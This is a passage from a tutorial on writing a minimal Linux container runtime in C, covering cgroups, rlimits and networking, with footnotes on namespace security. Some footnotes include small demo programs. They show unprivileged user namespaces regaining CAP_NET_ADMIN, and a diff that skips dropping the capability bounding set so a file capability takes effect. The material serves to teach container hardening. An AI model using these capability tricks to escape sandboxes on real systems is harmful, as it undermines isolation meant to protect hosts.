<li>In each controller, you can create a cgroup with a name with
<code>mkdir</code>. For memory, <code>mkdir /sys/fs/cgroup/memory/$hostname</code>.</li>
<li>Inside of that you can write to the individual files to set
values. For example, <code>echo $MEMORY &gt;
  /sys/fs/cgroup/memory/$hostname/memory.limit_in_bytes</code>.</li>
<li>You can a pid to <code>tasks</code> to add the process tree to the cgroup. "0"
is a special value that means "the writing process".</li>
</ul>

<p>
so I'll iterate over that structure and fill in the values.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 183: </span><code>&lt;&lt;resources&gt;&gt;</code> +=</label><pre class="src src-C">int resources(struct child_config *config)
{
	fprintf(stderr, "=&gt; setting cgroups...");
	for (struct cgrp_control **cgrp = cgrps; *cgrp; cgrp++) {
		char dir[PATH_MAX] = {0};
		fprintf(stderr, "%s...", (*cgrp)-&gt;control);
		if (snprintf(dir, sizeof(dir), "/sys/fs/cgroup/%s/%s",
			     (*cgrp)-&gt;control, config-&gt;hostname) == -1) {
			return -1;
		}
		if (mkdir(dir, S_IRUSR | S_IWUSR | S_IXUSR)) {
			fprintf(stderr, "mkdir %s failed: %m\n", dir);
			return -1;
		}
		for (struct cgrp_setting **setting = (*cgrp)-&gt;settings; *setting; setting++) {
			char path[PATH_MAX] = {0};
			int fd = 0;
			if (snprintf(path, sizeof(path), "%s/%s", dir,
				     (*setting)-&gt;name) == -1) {
				fprintf(stderr, "snprintf failed: %m\n");
				return -1;
			}
			if ((fd = open(path, O_WRONLY)) == -1) {
				fprintf(stderr, "opening %s failed: %m\n", path);
				return -1;
			}
			if (write(fd, (*setting)-&gt;value, strlen((*setting)-&gt;value)) == -1) {
				fprintf(stderr, "writing to %s failed: %m\n", path);
				close(fd);
				return -1;
			}
			close(fd);
		}
	}
	fprintf(stderr, "done.\n");
</pre>
</div>

<p>
I'll also lower the hard limit on the number of file descriptors. The
file descriptor number, like the number of pids, is per-user, and so
we want to prevent in-container process from occupying all of
them. Setting the hard limit sets a permanent upper bound for this
process tree, since I've dropped
<code>CAP_SYS_RESOURCE</code> <sup><a id="fnr.92" class="footref" href="#fn.92">92</a></sup>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 185: </span><code>&lt;&lt;resources&gt;&gt;</code> +=</label><pre class="src src-C">	fprintf(stderr, "=&gt; setting rlimit...");
	if (setrlimit(RLIMIT_NOFILE,
		      &amp; (struct rlimit) {
			.rlim_max = FD_COUNT,
			.rlim_cur = FD_COUNT,
		})) {
		fprintf(stderr, "failed: %m\n");
		return 1;
	}
	fprintf(stderr, "done.\n");
	return 0;
}
</pre>
</div>


<p>
We'd also like to clean up the cgroup for this hostname. There's
built-in functionality for this, but we would need to change
system-wide values to do it cleanly<sup><a id="fnr.93" class="footref" href="#fn.93">93</a></sup>. Since we
have the <code>contained</code> process waiting on the contained process, it's
simple to do it this way. First we move the <code>contained</code> process back
into the root <code>tasks</code>; then, since the child process is finished, and
leaving the pid namespace <code>SIGKILLS</code> its children, the <code>tasks</code> is
empty. We can safely <code>rmdir</code> at this point.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 187: </span><code>&lt;&lt;resources&gt;&gt;</code> +=</label><pre class="src src-C">
int free_resources(struct child_config *config)
{
	fprintf(stderr, "=&gt; cleaning cgroups...");
	for (struct cgrp_control **cgrp = cgrps; *cgrp; cgrp++) {
		char dir[PATH_MAX] = {0};
		char task[PATH_MAX] = {0};
		int task_fd = 0;
		if (snprintf(dir, sizeof(dir), "/sys/fs/cgroup/%s/%s",
			     (*cgrp)-&gt;control, config-&gt;hostname) == -1
		    || snprintf(task, sizeof(task), "/sys/fs/cgroup/%s/tasks",
				(*cgrp)-&gt;control) == -1) {
			fprintf(stderr, "snprintf failed: %m\n");
			return -1;
		}
		if ((task_fd = open(task, O_WRONLY)) == -1) {
			fprintf(stderr, "opening %s failed: %m\n", task);
			return -1;
		}
		if (write(task_fd, "0", 2) == -1) {
			fprintf(stderr, "writing to %s failed: %m\n", task);
			close(task_fd);
			return -1;
		}
		close(task_fd);
		if (rmdir(dir)) {
			fprintf(stderr, "rmdir %s failed: %m", dir);
			return -1;
		}
	}
	fprintf(stderr, "done.\n");
	return 0;
}
</pre>
</div>
</div>
</div>

<div id="outline-container-org65bbba4" class="outline-3">
<h3 id="org65bbba4">Networking</h3>
<div class="outline-text-3" id="text-org65bbba4">
<p>
Container networking takes a little too much explanation for this
space. It usually works like this:
</p>

<ul class="org-ul">
<li>Create a bridge device.</li>
<li>Create a virtual ethernet pair and attach one end to the bridge.</li>
<li>Put the other end in the network namespace.</li>
<li>For outside networking access, the host needs to be set to forward
(and possibly NAT) packets.</li>
</ul>

<p>
Having multiple contained processes sharing a bridge device would mean
they're both on the same LAN from the host's perspective. So ARP
spoofing is a recurring issue with containers that work this
way<sup><a id="fnr.94" class="footref" href="#fn.94">94</a></sup>.
</p>

<p>
The canonical way to do this from C is the <code>rtnetlink</code> interface; it
would probably be easier to use <code>ip link ...</code>.
</p>


<p>
We could also limit the network usage with the <code>net_prio</code> cgroup
controller<sup><a id="fnr.95" class="footref" href="#fn.95">95</a></sup>.
</p>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1">1</a></sup> <div class="footpara"><p class="footpara">
<a href="https://medium.com/@ewindisch/linux-user-namespaces-might-not-be-secure-enough-a-k-a-subverting-posix-capabilities-f1c4ae19cad#.3lbw4loa7">"Linux User Namespaces Might Not Be Secure Enough"</a> by Erica Windisch:
</p>

<blockquote>
<p>
If a (real) root user has had the SYS_CAP_ADMIN capability
removed, but then creates a user namespace, this capability is
restored for the (fake) root user. That is, before creating the
namespace, â€˜mountâ€™ would be denied, but following the creation of
the user namespace, the â€˜mountâ€™ syscall would magically work
again, albeit in a limited fashion. While limited in function,
itâ€™s significant enough that given a (real) root user and a kernel
with user namespaces, Linux capabilities may be completely
subverted.
</p>
</blockquote>

<p class="footpara">
and <a href="http://man7.org/linux/man-pages/man7/user_namespaces.7.html"><code>man 7 user_namespaces</code></a> says:
</p>

<blockquote>
<p>
The child process created by clone(2) with the CLONE_NEWUSER
flag starts out with a complete set of capabilities in the new
user namespace.
</p>
</blockquote>

<p class="footpara">
and <a href="https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/2016/april/ncc_group_understanding_hardening_linux_containers-1-1.pdf">"Understanding and Hardening Linux Containers"</a> again
</p>

<blockquote>
<p>
User namespaces also allows for ``interesting'' intersections of
security models, whereas full root capabilities are granted to new
namespace. This can allow CLONE_NEWUSER to effectively use
CAP_NET_ADMIN over other network namespaces as they are exposed,
and if containers are not in use. Additionally, as we have seen many
times, processes with CAP_NET_ADMIN have a large attack surface and
have resulted in a number of different kernel vulnerabilities. This
may allow an unprivileged user namespace to target a large attack
surface (the kernel networking subsystem) whereas a privileged
container with reduced capabilities would not have such
permissions. See Section 5.5 on page 39 for a more in-depth discussion
on this topic.
</p>
</blockquote>

<p class="footpara">
We can demonstrate this behavior (on a host with user namespaces
compiled in) with
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 1: </span><code>subverting_networking.c</code></label><pre class="src src-C">/* Local Variables: */
/* compile-command: "gcc -Wall -Werror -static  subverting_networking.c \*/
/*                   -o subverting_networking" */
/* End: */
#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sched.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/sockios.h&gt;

int main (int argc, char **argv)
{
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET)) {
		fprintf(stderr, "++ unshare failed: %m\n");
		return 1;
	}
	/* this is how you create a bridge... */
	int sock = 0;
	if ((sock = socket(PF_LOCAL, SOCK_STREAM, 0)) == -1) {
		fprintf(stderr, "++ socket failed: %m\n");
		return 1;
	}
	if (ioctl(sock, SIOCBRADDBR, "br0")) {
		fprintf(stderr, "++ ioctl failed: %m\n");
		close(sock);
		return 1;
	}
	close(sock);
	fprintf(stderr, "++ success!\n");
	return 0;
}
</pre>
</div>

<pre class="example">
  alpine-kernel-dev:~$ whoami
  lizzie
  alpine-kernel-dev:~$ ./subverting_networking
  ++ success!
  alpine-kernel-dev:~$
</pre>

<p class="footpara">
but we're not actually that powerful.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 2: </span><code>subverting_setfcap.c</code></label><pre class="src src-C">/* Local Variables: */
/* compile-command: "gcc -Wall -Werror -lcap -static subverting_setfcap.c \*/
/*                   -o subverting_setfcap" */
/* End: */
#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;sched.h&gt;
#include &lt;linux/capability.h&gt;
#include &lt;sys/capability.h&gt;

int main (int argc, char **argv)
{
	if (unshare(CLONE_NEWUSER)) {
		fprintf(stderr, "++ unshare failed: %m\n");
		return 1;
	}
	cap_t cap = cap_from_text("cap_net_admin+ep");
	if (cap_set_file("example", cap)) {
		fprintf(stderr, "++ cap_set_file failed: %m\n");
		cap_free(cap);
		return 1;
	}
	cap_free(cap);
	return 0;
}
</pre>
</div>

<pre class="example">
  alpine-kernel-dev:~$ whoami
  lizzie
  alpine-kernel-dev:~$ touch example
  alpine-kernel-dev:~$ ./subverting_setfcap
  ++ cap_set_file failed: Operation not permitted
</pre></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2">2</a></sup> <div class="footpara"><p class="footpara">
<a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/init/Kconfig?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1207"><code>init/Kconfig:1207@c8d2bc</code></a>
</p>
<div class="org-src-container">
<pre class="src src-text">config USER_NS
	bool "User namespace"
	default n
	help
	  This allows containers, i.e. vservers, to use user namespaces
	  to provide different user info for different servers.

	  When user namespaces are enabled in the kernel it is
	  recommended that the MEMCG option also be enabled and that
	  user-space use the memory control groups to limit the amount
	  of memory a memory unprivileged users can use.

	  If unsure, say N.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.3" class="footnum" href="#fnr.3">3</a></sup> <div class="footpara"><p class="footpara">
Ubuntu switches <code>CONFIG_USER_NS</code> on, but patches it so that it
unprivileged use can be disabled with a sysctl,
<code>unpriviliged_userns_clone</code>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 3: </span><a href="http://kernel.ubuntu.com/git/ubuntu/ubuntu-xenial.git/commit/?id=92e575e769cc50a9bfb50fb58fe94aab4f2a2bff"><code>92e575e769cc50a9bfb50fb58fe94aab4f2a2bff</code></a></label><pre class="src src-diff">commit 92e575e769cc50a9bfb50fb58fe94aab4f2a2bff
Author: Serge Hallyn &lt;redacted&gt;
Date:   Tue Jan 5 20:12:21 2016 +0000

    UBUNTU: SAUCE: add a sysctl to disable unprivileged user namespace unsharing
    
    It is turned on by default, but can be turned off if admins prefer or,
    more importantly, if a security vulnerability is found.
    
    The intent is to use this as mitigation so long as Ubuntu is on the
    cutting edge of enablement for things like unprivileged filesystem
    mounting.
    
    (This patch is tweaked from the one currently still in Debian sid, which
    in turn came from the patch we had in saucy)
    
    Signed-off-by: Serge Hallyn &lt;redacted&gt;
    [bwh: Remove unneeded binary sysctl bits]
    Signed-off-by: Tim Gardner &lt;redacted&gt;
</pre>
</div>

<p class="footpara">
Debian has the same behavior:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 4: </span><a href="https://anonscm.debian.org/git/kernel/linux.git/tree/debian/patches/debian/add-sysctl-to-disallow-unprivileged-CLONE_NEWUSER-by-default.patch"><code>debian/patches/debian/add-sysctl-to-allow-unprivileged-CLONE_NEWUSER-by-default.patch</code></a></label><pre class="src src-diff">From: Serge Hallyn &lt;redacted&gt;
Date: Fri, 31 May 2013 19:12:12 +0000 (+0100)
Subject: add sysctl to disallow unprivileged CLONE_NEWUSER by default
Origin: http://kernel.ubuntu.com/git?p=serge%2Fubuntu-saucy.git;a=commit;h=5c847404dcb2e3195ad0057877e1422ae90892b8

add sysctl to disallow unprivileged CLONE_NEWUSER by default

This is a short-term patch.  Unprivileged use of CLONE_NEWUSER
is certainly an intended feature of user namespaces.  However
for at least saucy we want to make sure that, if any security
issues are found, we have a fail-safe.

Signed-off-by: Serge Hallyn &lt;redacted&gt;
[bwh: Remove unneeded binary sysctl bits]
---
</pre>
</div>

<p class="footpara">
Grsecurity disables it entirely for users without <code>CAP_SYS_ADMIN</code>,
<code>CAP_SETUID</code>, and <code>CAP_SETGID</code>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 5: </span><a href="https://grsecurity.net/test/grsecurity-3.1-4.7.9-201610200819.patch">https://grsecurity.net/test/grsecurity-3.1-4.7.9-201610200819.patch</a></label><pre class="src src-diff">--- a/kernel/user_namespace.c
+++ b/kernel/user_namespace.c
@@ -84,6 +84,21 @@ int create_user_ns(struct cred *new)
 	    !kgid_has_mapping(parent_ns, group))
 		return -EPERM;
 
+#ifdef CONFIG_GRKERNSEC
+	/*
+	 * This doesn't really inspire confidence:
+	 * http://marc.info/?l=linux-kernel&amp;m=135543612731939&amp;w=2
+	 * http://marc.info/?l=linux-kernel&amp;m=135545831607095&amp;w=2
+	 * Increases kernel attack surface in areas developers
+	 * previously cared little about ("low importance due
+	 * to requiring "root" capability")
+	 * To be removed when this code receives *proper* review
+	 */
+	if (!capable(CAP_SYS_ADMIN) || !capable(CAP_SETUID) ||
+			!capable(CAP_SETGID))
+		return -EPERM;
+#endif
</pre>
</div>

<p class="footpara">
and Arch Linux has it off.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 6: </span><a href="https://bugs.archlinux.org/task/36969">{linux} 3.13 add CONFIG_USER_NS</a></label><pre class="src src-text">Comment by William Kennington (Webhostbudd) - Sunday, 06 October 2013, 03:55 GMT

I agree with Florian, allowing non-root users to take advantage of
elevating themselves to a local root seems like a huge attack
surface. Preferably this would be a sysctl with a huge warning
attached to it when it is switched on.

Comment by Daniel Micay (thestinger) - Monday, 24 November 2014, 03:55 GMT

[...]  Arch doesn't add new features via patches. If you want to see
this feature enabled, then land something like this upstream. Note
that CONFIG_USER_NS is already enabled in the linux-grsec package
because it fully removes the ability to have unprivileged user
namespaces.
</pre>
</div>

<p class="footpara">
It would have been cool to include Red Hat's patches here, but I
couldn't find them.
</p></div></div>

<div class="footdef"><sup><a id="fn.4" class="footnum" href="#fnr.4">4</a></sup> <div class="footpara"><p class="footpara">
Most of this section is cribbed from the example at the bottom of <a href="http://man7.org/linux/man-pages/man2/clone.2.html"><code>man 2 clone</code></a>.
</p></div></div>

<div class="footdef"><sup><a id="fn.5" class="footnum" href="#fnr.5">5</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 11: </span><code>clone_stack.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror clone_stack.c -o clone_stack" -*- */
#define _GNU_SOURCE
#include &lt;sched.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

#define STACK_SIZE (1024 * 1024)

int child (void *_)
{
	int stack_value = 0;
	fprintf(stderr, "pre-execve, stack is ~%p\n", &amp;stack_value);
	execve("./show_stack", (char  *[]) {",/show_stack", 0}, NULL);
	return 0;
}

int main (int argc, char **argv) {
	void *stack = malloc(STACK_SIZE);
	clone(child, stack + STACK_SIZE, SIGCHLD, NULL);
	wait(NULL);
	return 0;
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 12: </span><code>show_stack.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -static show_stack.c -o show_stack" -*- */
#include &lt;stdio.h&gt;

int main (int argc, char **argv)
{
	int stack_value = 0;
	fprintf(stderr, "post-execve, stack is ~%p\n", &amp;stack_value);
	return 0;
}
</pre>
</div>

<pre class="example">
  [lizzie@empress linux-containers-in-500-loc]$ ./clone_stack
  pre-execve, stack is ~0x7f3f98deefec
  post-execve, stack is ~0x7ffd14d2291c
</pre>

<p class="footpara">
The stack grows down on x86, so the fact that the address is higher
numerically post-execve means that a new stack has been allocated.
</p></div></div>

<div class="footdef"><sup><a id="fn.6" class="footnum" href="#fnr.6">6</a></sup> <div class="footpara"><p class="footpara">
I thought this might be undefined behavior,
since <code>stack + STACK_SIZE</code> does point past the last item of the array,
but point 8 of 6.5.6 [Additive operators] in <a href="http://www.iso-9899.info/n1570.html">ISO-9899</a> has us covered:
</p>

<blockquote>
<p>
If both the pointer
operand and the result point to elements of the same array object, or one past the last
element of the array object, the evaluation shall not produce an overflow; otherwise, the
behavior is undefined. If the result points one past the last element of the array object, it
shall not be used as the operand of a unary * operator that is evaluated.
</p>
</blockquote>
<p class="footpara">
i.e., the pointer addition is valid, but dereferencing it wouldn't be.
</p></div></div>

<div class="footdef"><sup><a id="fn.7" class="footnum" href="#fnr.7">7</a></sup> <div class="footpara"><p class="footpara">
I wasn't confident that <code>waitpid</code> was enough to wait for the process
and all of its children, but when the root of a pid namespace closes,
all of its children get <code>SIGKILL</code>:
</p>

<p class="footpara">
<a href="http://man7.org/linux/man-pages/man7/pid_namespaces.7.html"><code>man 7 pid_namespaces</code></a>:
</p>
<blockquote>
<p>
If the  "init" process  of a  PID namespace  terminates, the
kernel terminates all of the  processes in the namespace via
a SIGKILL signal.  This behavior  reflects the fact that the
"init" process is  essential for the correct  operation of a
PID namespace.
</p>
</blockquote>

<p class="footpara">
Also verified this myself, before I found that:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 18: </span><code>persistent_child.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -static persistent_child.c -o persistent_child" -*- */
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;

int main (int argc, char **argv)
{
	switch (fork()) {
	case -1:
		fprintf(stderr, "++ fork failed: %m\n");
		return 1;
	case 0:;
		int fd = 0;
		if ((fd = open("persistent_child.log",
			       O_CREAT | O_APPEND | O_WRONLY,
			       S_IRUSR | S_IWUSR)) == -1) {
			fprintf(stderr, "++ open failed: %m\n");
			return 1;
		}
		size_t count = 0;
		while (count &lt; 100) {
			if (dprintf(fd, "%lu\n", count++) &lt; 0) {
				fprintf(stderr, "++ dprintf failed: %m\n");
				close(fd);
				return 1;
			}
			sleep(1);
		}
		close(fd);
		return 0;
	default:
		sleep(2);
		return 0;
	}
}
</pre>
</div>

<pre class="example">
[lizzie@empress l-c-i-500-l]$ touch persistent_child.log 
[lizzie@empress l-c-i-500-l]$ chmod 666 persistent_child.log 
[lizzie@empress l-c-i-500-l]$ sudo strace -f ./contained -m . -u 0 -c ./persistent_child
execve("./contained", ["./contained", "-m", ".", "-u", "0", "-c", "./persistent_child"], [/* 15 vars */]) = 0
brk(NULL)                               = 0x605490
# ...
[pid   736] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x6b68d0) = 2
strace: Process 746 attached
[pid   736] nanosleep({2, 0},  &lt;unfinished ...&gt;
[pid   746] open("persistent_child.log", O_WRONLY|O_CREAT|O_APPEND, 0600) = 3
[pid   746] fstat(3, {st_mode=S_IFREG|0666, st_size=4, ...}) = 0
[pid   746] lseek(3, 0, SEEK_CUR)       = 0
[pid   746] write(3, "0\n", 2)          = 2
[pid   746] nanosleep({1, 0}, 0x3fee2d718d0) = 0
[pid   746] fstat(3, {st_mode=S_IFREG|0666, st_size=6, ...}) = 0
[pid   746] lseek(3, 0, SEEK_CUR)       = 6
[pid   746] write(3, "1\n", 2)          = 2
[pid   746] nanosleep({1, 0},  &lt;unfinished ...&gt;
[pid   736] &lt;... nanosleep resumed&gt; 0x3fee2d718d0) = 0
[pid   736] exit_group(0)               = ?
[pid   746] +++ killed by SIGKILL +++
[pid   736] +++ exited with 0 +++
# ...
</pre>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 19: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">	close(sockets[1]);
	sockets[1] = 0;
	if (handle_child_uid_map(child_pid, sockets[0])) {
		err = 1;
		goto kill_and_finish_child;
	}

	goto finish_child;
kill_and_finish_child:
	if (child_pid) kill(child_pid, SIGKILL);
finish_child:;
	int child_status = 0;
	waitpid(child_pid, &amp;child_status, 0);
	err |= WEXITSTATUS(child_status);
clear_resources:
	free_resources(&amp;config);
	free(stack);
</pre>
</div>

<p class="footpara">
A process setting its own user namespace is pretty
limited<sup><a id="fnr.8" class="footref" href="#fn.8">8</a></sup>, so the parent will wait until the
child enters the user namespace, and then write a mapping to its
<code>uid_map</code> and <code>gid_map</code>.
</p></div></div>

<div class="footdef"><sup><a id="fn.8" class="footnum" href="#fnr.8">8</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 20: </span><a href="http://man7.org/linux/man-pages/man7/user_namespaces.7.html"><code>man 7 user_namespaces</code></a></label><pre class="src src-text">	In order for  a process to write  to the /proc/[pid]/uid_map
	(/proc/[pid]/gid_map)   file,    all   of    the   following
	requirements must be met:

	1. The writing process must have the CAP_SETUID (CAP_SETGID)
	   capability in the user namespace of the process pid.

	2. The writing process must either  be in the user namespace
	   of the process pid or be  in the parent user namespace of
	   the process pid.

	3. The  mapped user  IDs (group  IDs)  must in  turn have  a
	   mapping in the parent user namespace.

	4. One of the following two cases applies:

	   *  Either   the  writing   process  has   the  CAP_SETUID
		 (CAP_SETGID) capability in the parent user namespace.

		 +  No further restrictions apply: the process can make
		    mappings to  arbitrary user IDs (group  IDs) in the
		    parent user namespace.

	   *  Or otherwise all of the following restrictions apply:

		 +  The data written to  uid_map (gid_map) must consist
		    of a  single line  that maps the  writing process's
		    effective  user ID  (group ID)  in the  parent user
		    namespace  to a  user  ID (group  ID)  in the  user
		    namespace.

		 +  The writing  process must  have the  same effective
		    user  ID  as  the  process that  created  the  user
		    namespace.

		 +  In  the case  of gid_map,  use of  the setgroups(2)
		    system call must first be denied by writing deny to
		    the /proc/[pid]/setgroups  file (see  below) before
		    writing to gid_map.

	Writes  that violate  the above  rules fail  with the  error
	EPERM.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.9" class="footnum" href="#fnr.9">9</a></sup> <div class="footpara"><p class="footpara">
<code>gid</code>, <code>sgid</code>, and <code>egid</code> are separate from <code>group_info</code> in <code>struct cred</code>:
</p>
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 22: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/include/linux/cred.h?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n95"><code>include/linux/cred.h:95@c8d2bc</code></a></label><pre class="src src-C">/*
 * The security context of a task
 *
 * The parts of the context break down into two categories:
 *
 *  (1) The objective context of a task.  These parts are used when some other
 *	task is attempting to affect this one.
 *
 *  (2) The subjective context.  These details are used when the task is acting
 *	upon another object, be that a file, a task, a key or whatever.
 *
 * Note that some members of this structure belong to both categories - the
 * LSM security pointer for instance.
 *
 * A task has two security pointers.  task-&gt;real_cred points to the objective
 * context that defines that task's actual details.  The objective part of this
 * context is used whenever that task is acted upon.
 *
 * task-&gt;cred points to the subjective context that defines the details of how
 * that task is going to act upon another object.  This may be overridden
 * temporarily to point to another security context, but normally points to the
 * same context as task-&gt;real_cred.
 */
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.10" class="footnum" href="#fnr.10">10</a></sup> <div class="footpara"><p class="footpara">
For example, <code>test_perm</code> in the <code>/proc/sys</code>-handling-code:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 25: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/fs/proc/proc_sysctl.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n406"><code>fs/proc/proc_sysctl.c:406@c8d2bc</code></a></label><pre class="src src-C">static int test_perm(int mode, int op)
{
	if (uid_eq(current_euid(), GLOBAL_ROOT_UID))
		mode &gt;&gt;= 6;
	else if (in_egroup_p(GLOBAL_ROOT_GID))
		mode &gt;&gt;= 3;
	if ((op &amp; ~mode &amp; (MAY_READ|MAY_WRITE|MAY_EXEC)) == 0)
		return 0;
	return -EACCES;
}
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.11" class="footnum" href="#fnr.11">11</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 26: </span><code>try_regain_cap.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -static try_regain_cap.c -o try_regain_cap" -*- */
#include &lt;linux/capability.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;stdio.h&gt;

int main (int argc, char  **argv)
{
	if (prctl(PR_CAPBSET_READ, CAP_MKNOD, 0, 0, 0)) {
 		fprintf(stderr, "++ have CAP_MKNOD\n");
	} else {
		fprintf(stderr, "++ don't have CAP_MKNOD\n");
	}
	return 0;
}
</pre>
</div>

<p class="footpara">
If we drop the bounding set, files with extra capabilities don't get those capabilities:
</p>
<pre class="example">
[lizzie@empress l-c-i-500-l]$ sudo setcap "cap_mknod+p" try_regain_cap
[lizzie@empress l-c-i-500-l]$ sudo ./contained -m . -u 0 -c try_regain_cap
=&gt; validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.lVLNB1...done.
=&gt; trying a user namespace...writing /proc/852/uid_map...writing /proc/852/gid_map...done.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
++ don't have CAP_MKNOD
=&gt; cleaning cgroups...done.
</pre>

<p class="footpara">
but if we don't, they work:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 27: </span><code>allow_all_caps.diff</code></label><pre class="src src-diff">diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..6ab1719 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -53,10 +53,7 @@ int capabilities()
 	size_t num_caps = sizeof(drop_caps) / sizeof(*drop_caps);
 	fprintf(stderr, "bounding...");
 	for (size_t i = 0; i &lt; num_caps; i++) {
-		if (prctl(PR_CAPBSET_DROP, drop_caps[i], 0, 0, 0)) {
-			fprintf(stderr, "prctl failed: %m\n");
-			return 1;
-		}
+		continue;
 	}
 	fprintf(stderr, "inheritable...");
 	cap_t caps = NULL;
</pre>
</div>

<pre class="example">
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_all_caps -m . -u 0 -c try_regain_cap
=&gt; validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.Qnzw2A...done.
=&gt; trying a user namespace...writing /proc/940/uid_map...writing /proc/940/gid_map...done.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
++ have CAP_MKNOD
=&gt; cleaning cgroups...done.
</pre>

<p class="footpara">
(and if we set <code>+ep</code>, execve fails because it's considered a
"capability-dumb binary")
</p>

<pre class="example">
[lizzie@empress l-c-i-500-l]$ sudo setcap "cap_mknod+ep" try_regain_cap
[lizzie@empress l-c-i-500-l]$ sudo ./contained -m . -u 0 -c try_regain_cap
=&gt; validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
